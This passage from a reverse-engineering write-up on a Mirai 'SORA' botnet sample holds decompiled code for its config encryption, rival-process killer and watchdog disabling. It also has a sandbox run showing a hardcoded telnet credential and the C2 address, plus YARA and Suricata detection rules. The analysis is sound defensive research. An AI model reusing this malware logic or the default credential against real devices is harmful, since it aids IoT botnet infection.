  if (param_2 != (uint *)0x0) {
    param_3 = (uint)(byte)(&DAT_00020e69)[param_1];
    puVar2 = (undefined *)(uint)(byte)(&DAT_00020e68)[param_1];
  }
  uVar1 = *(undefined4 *)(&DAT_00020e64 + param_1);
  if (param_2 != (uint *)0x0) {
    *param_2 = (uint)puVar2 | param_3 << 8;
  }
  return uVar1;
}
```

```c
void mw_encrypt_with_key(uint param_1)

{
  int iVar1;
  byte bVar2;
  uint uVar3;
  uint uVar4;
  undefined4 uVar5;
  int iVar6;
  int *piVar7;
  
  uVar5 = mw_key;
  iVar1 = (param_1 & 0xff) * 8;
  piVar7 = (int *)(&DAT_00020e64 + iVar1);
  uVar3 = (uint)mw_key >> 8;
  uVar4 = (uint)mw_key >> 0x10;
  bVar2 = (byte)mw_key;
  if (*(short *)(&DAT_00020e68 + iVar1) == 0) {
    return;
  }
  iVar6 = 0;
  do {
    *(byte *)(iVar6 + *piVar7) = bVar2 ^ *(byte *)(iVar6 + *piVar7);
    *(byte *)(iVar6 + *piVar7) = (byte)uVar3 ^ *(byte *)(iVar6 + *piVar7);
    *(byte *)(iVar6 + *piVar7) = (byte)uVar4 ^ *(byte *)(iVar6 + *piVar7);
    *(byte *)(iVar6 + *piVar7) = (byte)((uint)uVar5 >> 0x18) ^ *(byte *)(iVar6 + *piVar7);
    iVar6 = iVar6 + 1;
  } while (iVar6 < (int)(uint)*(ushort *)(&DAT_00020e68 + iVar1));
  return;
}
```

#### `mw_init_attack_table`

`mw_init_attack_table` initializes the attack table with different attack vectors (UDP/TCP/HTTP DDoS variants). The HTTP flood might not work properly because the necessary configuration has been encrypted with the key `0xdeadbeef` but this variant uses `0xdedefbaf`. This means the decrypted data (e.g. the [user agents](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/table.h#L69)) will be garbage. Showing the lengthy implementation of `mw_init_attack_table` and the attack vectors does not add much value so only the call graph is discussed:

```c
Outgoing References - mw_init_attack_table
    mw_calloc
    mw_udp_plain_flood_payload_4096
    mw_realloc
    mw_udp_plain_flood_payload_1024
    mw_tcp_null_flood
    mw_tcp_ack_flood
    mw_udp_crafted_flood
    mw_tcp_rst_flood
    mw_tcp_ack_psh_flood
    mw_tcp_syn_flood
    mw_tcp_xmas_flood
    mw_http_flood
```

`mw_udp_crafted_flood` creates custom packets with raw sockets, manually crafting IP headers for precise control. `mw_udp_plain_flood_payload_1024` and `mw_udp_plain_flood_payload_4096` use standard UDP sockets with OS-managed headers.

The HTTP flood is the same as the [original](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/attack_app.c#L26) and the TCP floods are standard DDoS methods which can be looked up online.

The [original code](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/attack.c#L22) supports different attack vectors:
- `attack_udp_generic`
- `attack_udp_vse`
- `attack_udp_dns`
- `attack_udp_plain`
- `attack_tcp_syn`
- `attack_tcp_ack`
- `attack_tcp_stomp`
- `attack_gre_ip`
- `attack_gre_eth`
- `attack_app_http`

#### `mw_init_killer`

`mw_init_killer` resolves its own binary path (for later use) and iterates over the `/proc` directory and searches for different processes.

```c
void mw_init_killer(void)

{
...
    mw_decrypt_with_key(0xd); // /proc
    mw_decrypt_with_key(0xe); // /exe
    uVar2 = mw_get_table_entry(0xd,0);
    iVar3 = mw_strcpy(realpath,uVar2);
    puVar34 = realpath + iVar3;
    uVar2 = mw_getpid();
    uVar2 = mw_itoa(uVar2,10,auStack_a4);
    iVar3 = mw_strcpy(puVar34,uVar2);
    uVar2 = mw_get_table_entry(0xe,0);
    tmp1 = mw_strcpy(puVar34 + iVar3,uVar2);
    tmp2 = mw_open(realpath,0);
    if (tmp2 != -1) {
      mw_close();
      mw_encrypt_with_key(0xd);
      mw_encrypt_with_key(0xe);
      iVar4 = mw_readlink(realpath,killer_realpath);
...
```

```c
void mw_init_killer(void)

{
...
      pid_threshold = 400;
      iVar3 = 0;
      while( true ) {
        mw_decrypt_with_key(0xd);
        uVar2 = mw_get_table_entry(0xd,0); // /proc
        dir = mw_opendir(uVar2);
        if (dir == (DIR *)0x0) break;
        mw_encrypt_with_key(0xd);
LAB_0000e340:
        file = mw_readdir(dir);
        if (file != (dirent *)0x0) {
          while ((byte)file->d_name[0] - 0x30 < 10) {
            pid_str = file->d_name;
            pid = mw_atoi(pid_str);
            iVar3 = iVar3 + 1;
            if (pid_threshold < pid) {
              iVar1 = mw_time(0);
              mw_decrypt_with_key(0xd); // /proc
              mw_decrypt_with_key(0xe); // /exe
              uVar2 = mw_get_table_entry(0xd,0);
              iVar4 = mw_strcpy(exe_path,uVar2);
              iVar5 = mw_strcpy(exe_path + iVar4,pid_str);
              uVar2 = mw_get_table_entry(0xe,0);
              mw_strcpy(exe_path + iVar4 + iVar5,uVar2);
...
              mw_encrypt_with_key(0xd);
              mw_encrypt_with_key(0xe);
              iVar4 = mw_readlink(exe_path,realpath,0xfff);
...
```


It searches for process names containing `.anime` which is a competitor botnet and tries to kill them.

```c
void mw_init_killer(void)

{
...
              iVar4 = mw_readlink(exe_path,realpath,0xfff);
              pid_threshold = pid;
              if (iVar4 != -1) {
                realpath[iVar4] = 0;
                mw_decrypt_with_key(0x1e); // .anime
                uVar2 = mw_get_table_entry(0x1e,0);
                iVar4 = mw_strcasestr(realpath,iVar4 + -1,uVar2);
                if (iVar4 != -1) {
                  mw_unlink(realpath);
                  mw_kill(pid,9);
                }
                mw_encrypt_with_key(0x1e);
...
```

It also searches for other processes (config ID 0x21..0x3a) and tries to kill them as well, but they are encrypted with key `0xdeadbeef` so decrypting them with `0xdedefbaf` results in garbage strings. For this reason this useless code is not shown here but the original implementation can be found [here](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/killer.c#L494).

It also looks for other processes that have their binary deleted which is often a sign of malware that tries to hide itself. 

```c
void mw_init_killer(void)

{
...
                iVar4 = mw_getpid();
                if (((pid == iVar4) || (iVar4 = mw_getppid(), pid == iVar4)) ||
                   (iVar4 = mw_strcmp(realpath,killer_realpath), iVar4 != 0)) break;
                iVar4 = mw_open(realpath,0);
                if (iVar4 == -1) {
                  mw_kill(pid,9);
                }
                mw_close(iVar4);
...
```

At the end it zeroes out `exe_path` because other processes might scan the memory as well.

```c
void mw_init_killer(void)

{
...
  mw_memset_zero(exe_path,0x40);
...
```

#### `mw_watchdog_handler`

`mw_watchdog_handler` disables the watchdog and keeps sending keepalives (in case the disabling did not work).

```c
void mw_watchdog_handler(void)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 flags;
  
  DAT_00020da4 = mw_fork();
  if (0 < DAT_00020da4 || DAT_00020da4 == -1) {
    return;
  }
  flags = WDIOS_DISABLECARD;
  mw_decrypt_with_key(0x17); // /dev/watchdog
  mw_decrypt_with_key(0x18); // /dev/misc/watchdog
  uVar1 = mw_get_table_entry(0x17,0);
  iVar2 = mw_open(uVar1,2);
  if (iVar2 == -1) {
    uVar1 = mw_get_table_entry(0x18,0);
    iVar2 = mw_open(uVar1,2);
    if (iVar2 == -1) {
      mw_encrypt_with_key(0x17);
      mw_encrypt_with_key(0x18);
                    /* WARNING: Subroutine does not return */
      mw_safe_exit(0);
    }
  }
  mw_ioctl(iVar2,WDIOC_SETOPTIONS,&flags);
  do {
    mw_ioctl(iVar2,WDIOC_KEEPALIVE,0);
    mw_sleep_w(10);
  } while( true );
}
```

Relevant references can be found here:
- [https://www.kernel.org/doc/Documentation/watchdog/watchdog-api.txt](https://www.kernel.org/doc/Documentation/watchdog/watchdog-api.txt)
- [https://android.googlesource.com/platform/system/sepolicy/+/ae46511bfa62b56938b3df824bb2ee737dceaa7a/ioctl_defines#1781](https://android.googlesource.com/platform/system/sepolicy/+/ae46511bfa62b56938b3df824bb2ee737dceaa7a/ioctl_defines#1781)
- [https://github.com/torvalds/linux/blob/02ddfb981de88a2c15621115dd7be2431252c568/include/uapi/linux/watchdog.h](https://github.com/torvalds/linux/blob/02ddfb981de88a2c15621115dd7be2431252c568/include/uapi/linux/watchdog.h)

#### `mw_scanner`

The implementation of `mw_scanner` is identical to the [original one](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/scanner.c). The only difference is in the hardcoded credentials (see chapter "Encrypted credentials" above).

High level overview:
1. sends SYN packets to port 23 (telnet) randomly generated IP addresses (there is an exclude list [here](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/scanner.c#L688))
2. if a SYN+ACK is received, tries to authenticate with the credentials
3. if successfully authenticated, reports the vulnerable target along with the credentials to the C2
4. C2 handles the loading of the proper variant depending on the architecture

#### `mw_process_c2_cmd`

`mw_process_c2_cmd` handles the parsing of the received C2 commands and initiating different attack vectors. The implementation is identical to the [original one](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/attack.c#L64).

#### `mw_start_attack`

`mw_start_attack` is invoked by `mw_process_c2_cmd` and handles the launch of the attack vectors. The implementation is identical to the [original one](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/attack.c#L155).


#### Additional observations

The malware prints `Connected to CNC` even without network connection during startup. This is the only message printed because it closes the standard file descriptors:

```c
undefined4 mw_main(int param_1,undefined4 *param_2)

{
...
  mw_decrypt_with_key(3); // Connected To CNC
  uVar5 = mw_get_table_entry(3,&local_34);
  mw_write(1,uVar5,local_34);
  mw_write(1,"\n",1);
  mw_encrypt_with_key(3);
...
  mw_close(STDIN_FILENO);
  mw_close(STDOUT_FILENO);
  mw_close(STDERR_FILENO);
...
```

This variant does not implement the [`ensure_single_instance`](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/main.c#L420) and [self-termination](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/main.c#L211) mechanisms.

### Dynamic analysis

#### Prerequisites

Mirai (or at least this variant) works with BusyBox `telnetd` only (e.g. not with Ubuntu `telnetd` or Fedora `telnet-server`). `telnetd` starts a telnet server (port 23). `inetsim` is used to host a HTTP (port 80) and a DNS (port 53) server. The IP address of the isolated VM is 192.168.56.128, and the telnet, HTTP and DNS traffic (sent by Mirai) are redirected to this address. Only a subset of the telnet traffic is redirected, otherwise the telnet server would be overwhelmed. With this setup the malware can discover devices (in the 200.200.0.0/16 IP range) with telnet service enabled, can determine the local IP (see `mw_get_local_ip`) and also can connect to the fake C2 server. Since the details of the real C2 server(s) are unknown, this fake one can only accept connections.

```
sudo busybox telnetd -S -F
sudo ./inetsim
sudo iptables -t nat -A OUTPUT -p tcp -d 200.200.0.0/16 --dport 23 -j DNAT --to-destination 192.168.56.128:23
sudo iptables -t nat -A OUTPUT -p tcp -d 154.7.253.207 --dport 1312 -j DNAT --to-destination 192.168.56.128:80
sudo iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to-destination 192.168.56.128:53
sudo iptables -t nat -A POSTROUTING -o lo -j MASQUERADE
```

After the setup, start capturing with Wireshark.

#### Run

```
sudo strace -v -f -s 1024 -o strace.log ./mirai-unpacked.elf
```
or
```
sudo ./mirai-unpacked.elf
```

Wait for a couple of seconds then stop capturing and save the packets to a dumpfile (`mirai.pcap` in our case). The output can be analyzed e.g. with [`tshark`](https://www.wireshark.org/docs/man-pages/tshark.html).

Listing the TCP streams:
```
$ tshark -r mirai.pcap -Y "telnet" -T fields -e tcp.stream | sort -n | uniq
3547
3548
4804
4805
6051
6052
7306
7307
8534
8535
9730
9731
```
By following the TCP streams we can see that it tries to authenticate using the hardcoded telnet credentials, then tries to elevate privileges.

```
$ tshark -r mirai.pcap -q -z "follow,tcp,ascii,3547"

===================================================================
Follow: tcp,ascii
Filter: tcp.stream eq 3547
Node 0: 192.168.56.128:49612
Node 1: 192.168.56.128:23
3
...
3
...
9
....P....
3
...
3
...
4
root
2


12
7ujMko0vizxv
2


7
enable.
2


7
system.
2


6
shell.
2


3
sh.
2


===================================================================
```

It also connects to the C2 server:

```
$ tshark -r mirai.pcap -Y "ip.addr==154.7.253.207"
...
    2   0.000025 154.7.253.207 → 192.168.56.128 TCP 76 1312 → 47598 [SYN, ACK] Seq=0 Ack=1 Win=65483 Len=0 MSS=65495 SACK_PERM TSval=3143374026 TSecr=1568311960 WS=128
...
```

### IOCs

#### YARA

Note: the rules are available [here](https://github.com/gemesa/threat-detection-rules) as well.

##### Packed binary

```
import "elf"

rule mirai_sora_packed_arm {
  meta:
    description = "Mirai SORA packed (ARM)"
    author = "Andras Gemes"
    date = "2025-04-04"
    sha256 = "ad772931b53729665b609f0aaa712e7bc3245495c85162857388cf839efbc5c2"
    ref1 = "https://shadowshell.io/mirai-sora-botnet"
    ref2 = "https://bazaar.abuse.ch/sample/ad772931b53729665b609f0aaa712e7bc3245495c85162857388cf839efbc5c2"

  strings:
    $1 = "UPX!"
    $2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    $3 = "$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $"
    /*
    $ strings -n 6 mirai-packed.elf | head -n 15
    y$Qdl%
    aym&,ZYeC
    :b[;tgo
    1`Rg{z
    R5&9Sc
    \ME'Tj
    RSB$<|R
    a> ~!wqgUY
    fZ{Glb
    ld@j^]~
    902n	SP
    gP';H;
    ~-%&xI
    0N?>BH
    8?oVM\3
    */
    $4 = "y$Qdl%"
    $5 = "aym&,ZYeC"
    $6 = ":b[;tgo"
    $7 = "1`Rg{z"
    $8 = "R5&9Sc"
    $9 = "\\ME'Tj"
    $10 = "RSB$<|R"
    $11 = "a> ~!wqgUY"
    $12 = "fZ{Glb"
    $13 = "ld@j^]~"
    $14 = "902n	SP"
    $15 = "gP';H;"
    $16 = "~-%&xI"
    $17 = "0N?>BH"
    $18 = "8?oVM\\3"

  condition:
    defined(elf.type) and elf.machine == elf.EM_ARM and 13 of them
}
```

##### Unpacked binary

```
import "elf"

rule mirai_sora_unpacked_arm {
  meta:
    description = "Mirai SORA unpacked (ARM)"
    author = "Andras Gemes"
    date = "2025-04-04"
    sha256 = "ad772931b53729665b609f0aaa712e7bc3245495c85162857388cf839efbc5c2"
    ref1 = "https://shadowshell.io/mirai-sora-botnet"
    ref2 = "https://bazaar.abuse.ch/sample/ad772931b53729665b609f0aaa712e7bc3245495c85162857388cf839efbc5c2"

  strings:
    // C2
    $1 = "154.7.253.207"
    // config encryption key
    $2 = { af fb de de }
    // SORA: applet not found
    $3 = { 07 1b 06 15 6e 74 35 24 24 38 31 20 74 3a 3b 20 74 32 3b 21 3a 30 54 00 }
    // /bin/busybox SORA
    $4 = { 7b 36 3d 3a 7b 36 21 27 2d 36 3b 2c 74 07 1b 06 15 54 00 00 }
    // Connected To CNC
    $5 = { 17 3b 3a 3a 31 37 20 31 30 74 00 3b 74 17 1a 17 54 00 00 00 }
    // /dev/watchdog
    $6 = { 7b 30 31 22 7b 23 35 20 37 3c 30 3b 33 54 00 }
    // /dev/misc/watchdog
    $7 = { 7b 30 31 22 7b 39 3d 27 37 7b 23 35 20 37 3c 30 3b 33 54 00 }
    // C2 port number: 1312 (0x520)
    $8 = { 51 74 00 00 }
    // ogin
    $9 = { 3b 33 3d 3a 54 00 }
    // enter
    $10 = { 31 3a 20 31 26 54 00 }
    // enable
    $11 = { 31 3a 35 36 38 31 54 00 }
    // system
    $12 = { 27 2d 27 20 31 39 54 00 }
    // sh
    $13 = { 27 3c 54 00 }
    // shell
    $14 = { 27 3c 31 38 38 54 00 }
    // ncorrect
    $15 = { 3a 37 3b 26 26 31 37 20 54 00 }
    // /proc/
    $16 = { 7b 24 26 3b 37 7b 54 00 }
    // /exe
    $17 = { 7b 31 2c 31 54 00 }
    // .anime
    $18 = { 7a 35 3a 3d 39 31 54 00 }
    // credential decryption function
    /*
        0000ff98 00 20 a0 e3     mov        r2,#0x0
                             LAB_0000ff9c                                    XREF[1]:     0000ffb0(j)  
        0000ff9c 06 30 d2 e7     ldrb       r3,[r2,r6]
        0000ffa0 54 30 23 e2     eor        r3,r3,#0x54
        0000ffa4 06 30 c2 e7     strb       r3,[r2,r6]
        0000ffa8 01 20 82 e2     add        r2,r2,#0x1
        0000ffac 02 00 57 e1     cmp        r7,r2
        0000ffb0 f9 ff ff 1a     bne        LAB_0000ff9c
    */
    $19 = { 00 20 a0 e3 06 30 d2 e7 54 30 23 e2 06 30 c2 e7 01 20 82 e2 02 00 57 e1 ?? ?? ?? 1a }
    // config decryption function
    /*
        00013268 00 c0 a0 e3     mov        r12,#0x0
                             LAB_0001326c                                    XREF[1]:     000132c0(j)  
        0001326c 00 20 9e e5     ldr        r2,[lr,#0x0]=>DAT_00020e64                       = ??
        00013270 02 30 dc e7     ldrb       r3,[r12,r2]
        00013274 03 30 20 e0     eor        r3,r0,r3
        00013278 02 30 cc e7     strb       r3,[r12,r2]
        0001327c 00 10 9e e5     ldr        r1,[lr,#0x0]=>DAT_00020e64                       = ??
        00013280 01 30 dc e7     ldrb       r3,[r12,r1]
        00013284 03 30 26 e0     eor        r3,r6,r3
        00013288 01 30 cc e7     strb       r3,[r12,r1]
        0001328c 00 20 9e e5     ldr        r2,[lr,#0x0]=>DAT_00020e64                       = ??
        00013290 02 30 dc e7     ldrb       r3,[r12,r2]
        00013294 03 30 25 e0     eor        r3,r5,r3
        00013298 02 30 cc e7     strb       r3,[r12,r2]
        0001329c 00 10 9e e5     ldr        r1,[lr,#0x0]=>DAT_00020e64                       = ??
        000132a0 01 30 dc e7     ldrb       r3,[r12,r1]
        000132a4 03 30 24 e0     eor        r3,r4,r3
        000132a8 01 30 cc e7     strb       r3,[r12,r1]
        000132ac 04 20 de e5     ldrb       r2,[lr,#0x4]=>DAT_00020e68                       = ??
        000132b0 01 30 d7 e5     ldrb       r3,[r7,#0x1]=>DAT_00020e69                       = ??
        000132b4 01 c0 8c e2     add        r12,r12,#0x1
        000132b8 03 24 82 e1     orr        r2,r2,r3, lsl #0x8
        000132bc 0c 00 52 e1     cmp        r2,r12
        000132c0 e9 ff ff ca     bgt        LAB_0001326c
    */
    $20 = { 00 c0 a0 e3 00 20 9e e5 02 30 dc e7 03 30 20 e0 02 30 cc e7 00 10 9e e5 01 30 dc e7 03 30 26 e0 01 30 cc e7 00 20 9e e5 02 30 dc e7 03 30 25 e0 02 30 cc e7 00 10 9e e5 01 30 dc e7 03 30 24 e0 01 30 cc e7 04 20 de e5 01 30 d7 e5 01 c0 8c e2 03 24 82 e1 0c 00 52 e1 ?? ?? ?? ca }

  condition:
    defined(elf.type) and elf.machine == elf.EM_ARM and 13 of them
}
```

#### Suricata

Note: the rules are available [here](https://github.com/gemesa/threat-detection-rules) as well.

```
$ cat mirai.rules
alert tcp any any -> 154.7.253.207 any (msg:"Mirai SORA C2"; sid:1000001; rev:1;)
$ sudo suricata -c /etc/suricata/suricata.yaml -s mirai.rules -i 
$ sudo tail -f /var/log/suricata/fast.log
04/04/2025-16:15:20.435158  [**] [1:1000003:1] Mirai SORA C2 [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.56.128:49250 -> 154.7.253.207:1312
```

## Appendix

### Full call graph

A call graph (full depth with addresses) has been generated with a Ghidra script available [here](https://github.com/gemesa/ghidra-scripts/) for your reference if you want to follow along in Ghidra.

```
OrderedCallGraphGenerator.java> Running...
OrderedCallGraphGenerator.java> 
mw_main @ 0000f4bc
  mw_sigemptyset @ 000155a0
    mw_memset @ 000152c0
  mw_set_signal_mask @ 00015570
    mw_set_bit @ 00015694
    mw_get_errno_location @ 00015258
  mw_rt_sigprocmask @ 00014f00
    mw_get_errno_location @ 00015258 [already visited!]
  mw_signal @ 000155b8
    mw_get_errno_location @ 00015258 [already visited!]
    mw_set_bit @ 00015694 [already visited!]
    mw_test_bit @ 00015670
    mw_set_signal_handler @ 00016a60
      mw_memmove @ 000152a0
        mw_memmove @ 00017390 [already visited!]
      mw_rt_sigaction @ 00016b4c
        mw_get_errno_location @ 00015258 [already visited!]
  mw_sigtrap_handler @ 0000f364
    mw_setup_c2_connection @ 0000f37c
      mw_decrypt_with_key @ 00013218
      mw_inet_aton_w @ 0001537c
        mw_inet_aton @ 00017820
      mw_get_table_entry @ 00013134
      mw_encrypt_with_key @ 00013160
  mw_get_local_ip @ 000145a8
    mw_get_errno_location @ 00015258 [already visited!]
    mw_socket @ 00015544
      mw_get_errno_location @ 00015258 [already visited!]
    mw_connect @ 000153cc
      mw_get_errno_location @ 00015258 [already visited!]
    mw_getsockname @ 000153f8
      mw_get_errno_location @ 00015258 [already visited!]
    mw_close @ 00014c84
      mw_get_errno_location @ 00015258 [already visited!]
  mw_init_encrypted_config @ 000132d0
    mw_alloc @ 000156dc
      mw_noop_1 @ 00016774
      mw_allocate_from_freelist @ 00015a90
      mw_sbrk @ 00016f28
        mw_brk @ 00017948
          mw_get_errno_location @ 00015258 [already visited!]
      mw_insert_free_block @ 00015be4
        mw_prepend_node @ 00015bd0
        mw_insert_node @ 00015bb0
      mw_get_errno_location @ 00015258 [already visited!]
    mw_memcpy @ 000143cc
  mw_setup_c2_connection @ 0000f37c [already visited!]
  mw_seed_prng @ 0000fc44
    mw_time @ 00014f54
      mw_get_errno_location @ 00015258 [already visited!]
    mw_getpid @ 00014cdc
      mw_get_errno_location @ 00015258 [already visited!]
    mw_getppid @ 00014d08
      mw_get_errno_location @ 00015258 [already visited!]
    mw_get_timing_entropy @ 00015264
      mw_times @ 00016f80
        mw_get_errno_location @ 00015258 [already visited!]
  mw_memset_zero @ 000143f0
  mw_xorshift128_ulong @ 0000fbec
  mw_strlen @ 00014350
  mw_unsigned_modulo @ 00014a0c
    mw_noop_0 @ 00014bbc
  mw_xorshift128_str @ 0000fca0
    mw_decrypt_with_key @ 00013218 [already visited!]
    mw_get_table_entry @ 00013134 [already visited!]
    mw_strcpy_with_offset @ 00015360
    mw_strlen @ 00014350 [already visited!]
    mw_unsigned_modulo @ 00014a0c [already visited!]
    mw_encrypt_with_key @ 00013160 [already visited!]
  mw_strcpy @ 00014378
  mw_prctl @ 00014e1c
    mw_get_errno_location @ 00015258 [already visited!]
  mw_decrypt_with_key @ 00013218 [already visited!]
  mw_get_table_entry @ 00013134 [already visited!]
  mw_write @ 00014fac
    mw_get_errno_location @ 00015258 [already visited!]
  mw_encrypt_with_key @ 00013160 [already visited!]
  mw_init_attack_table @ 00008650
    mw_calloc @ 00015830
      mw_unsigned_divide @ 000148fc
        mw_noop_0 @ 00014bbc [already visited!]
      mw_get_errno_location @ 00015258 [already visited!]
      mw_alloc @ 000156dc [already visited!]
      mw_memset @ 000152c0 [already visited!]
    mw_udp_plain_flood_payload_4096 @ 0000aba4
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0
        mw_strtol @ 0001447c
          mw_unsigned_modulo @ 00014a0c [already visited!]
          mw_unsigned_divide @ 000148fc [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_bind @ 000153a0
        mw_get_errno_location @ 00015258 [already visited!]
      mw_connect @ 000153cc [already visited!]
      mw_send @ 000154b4
        mw_get_errno_location @ 00015258 [already visited!]
      mw_rand_bytes @ 0000fd6c
    mw_realloc @ 00015978
      mw_free @ 00015888
        mw_noop_1 @ 00016774 [already visited!]
        mw_insert_free_block @ 00015be4 [already visited!]
        mw_sbrk @ 00016f28 [already visited!]
      mw_alloc @ 000156dc [already visited!]
      mw_noop_1 @ 00016774 [already visited!]
      mw_search_and_split_free_block @ 00015b24
      mw_memmove @ 000152a0 [already visited!]
      mw_insert_free_block @ 00015be4 [already visited!]
    mw_udp_plain_flood_payload_1024 @ 0000ae88
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_bind @ 000153a0 [already visited!]
      mw_connect @ 000153cc [already visited!]
      mw_send @ 000154b4 [already visited!]
      mw_rand_bytes @ 0000fd6c [already visited!]
    mw_tcp_null_flood @ 000090fc
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_lookup_ip @ 00008574
        mw_inet_aton_w @ 0001537c [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_setsockopt @ 00015514
        mw_get_errno_location @ 00015258 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_checksum16 @ 0000e0b0
      mw_tcp_checksum @ 0000e10c
      mw_sendto @ 000154e0
        mw_get_errno_location @ 00015258 [already visited!]
      mw_close @ 00014c84 [already visited!]
    mw_tcp_ack_flood @ 00008988
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_lookup_ip @ 00008574 [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_setsockopt @ 00015514 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_rand_bytes @ 0000fd6c [already visited!]
      mw_checksum16 @ 0000e0b0 [already visited!]
      mw_tcp_checksum @ 0000e10c [already visited!]
      mw_sendto @ 000154e0 [already visited!]
      mw_close @ 00014c84 [already visited!]
    mw_udp_crafted_flood @ 0000a6e0
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_decrypt_with_key @ 00013218 [already visited!]
      mw_get_table_entry @ 00013134 [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_setsockopt @ 00015514 [already visited!]
      mw_memcpy @ 000143cc [already visited!]
      mw_checksum16 @ 0000e0b0 [already visited!]
      mw_tcp_checksum @ 0000e10c [already visited!]
      mw_sendto @ 000154e0 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_close @ 00014c84 [already visited!]
    mw_tcp_rst_flood @ 0000b16c
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_lookup_ip @ 00008574 [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_setsockopt @ 00015514 [already visited!]
      mw_lcg_fibonacci_w @ 00015e20
        mw_lcg_fibonacci_w @ 00015e24 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_checksum16 @ 0000e0b0 [already visited!]
      mw_tcp_checksum @ 0000e10c [already visited!]
      mw_sendto @ 000154e0 [already visited!]
      mw_close @ 00014c84 [already visited!]
    mw_tcp_ack_psh_flood @ 0000b8b8
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_setsockopt @ 00015514 [already visited!]
      mw_fcntl @ 00014bc0
        mw_fcntl64 @ 00014c34
          mw_get_errno_location @ 00015258 [already visited!]
        mw_get_errno_location @ 00015258 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_connect @ 000153cc [already visited!]
      mw_time @ 00014f54 [already visited!]
      mw_recvfrom @ 00015480
        mw_get_errno_location @ 00015258 [already visited!]
      mw_close @ 00014c84 [already visited!]
      mw_alloc @ 000156dc [already visited!]
      mw_rand_bytes @ 0000fd6c [already visited!]
      mw_checksum16 @ 0000e0b0 [already visited!]
      mw_tcp_checksum @ 0000e10c [already visited!]
      mw_sendto @ 000154e0 [already visited!]
    mw_tcp_syn_flood @ 00009848
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_lookup_ip @ 00008574 [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_setsockopt @ 00015514 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_checksum16 @ 0000e0b0 [already visited!]
      mw_tcp_checksum @ 0000e10c [already visited!]
      mw_sendto @ 000154e0 [already visited!]
      mw_close @ 00014c84 [already visited!]
    mw_tcp_xmas_flood @ 00009f94
      mw_calloc @ 00015830 [already visited!]
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_lookup_ip @ 00008574 [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_setsockopt @ 00015514 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_checksum16 @ 0000e0b0 [already visited!]
      mw_tcp_checksum @ 0000e10c [already visited!]
      mw_sendto @ 000154e0 [already visited!]
      mw_close @ 00014c84 [already visited!]
    mw_http_flood @ 0000c118
      mw_lookup_raw_value @ 000081cc
      mw_lookup_key_value @ 000085e0 [already visited!]
      mw_memset @ 000152c0 [already visited!]
      mw_strlen @ 00014350 [already visited!]
      mw_decrypt_with_key @ 00013218 [already visited!]
      mw_calloc @ 00015830 [already visited!]
      mw_signed_modulo @ 00014ad8
        mw_noop_0 @ 00014bbc [already visited!]
      mw_strcpy @ 00014378 [already visited!]
      mw_memmove @ 000152b0 [already visited!]
      mw_xorshift128_ulong @ 0000fbec [already visited!]
      mw_unsigned_modulo @ 00014a0c [already visited!]
      mw_time @ 00014f54 [already visited!]
      mw_close @ 00014c84 [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_fcntl @ 00014bc0 [already visited!]
      mw_setsockopt @ 00015514 [already visited!]
      mw_connect @ 000153cc [already visited!]
      mw__newselect @ 00014ea4
        mw_get_errno_location @ 00015258 [already visited!]
      mw_getsockopt @ 00015424
        mw_get_errno_location @ 00015258 [already visited!]
      mw_memset_zero @ 000143f0 [already visited!]
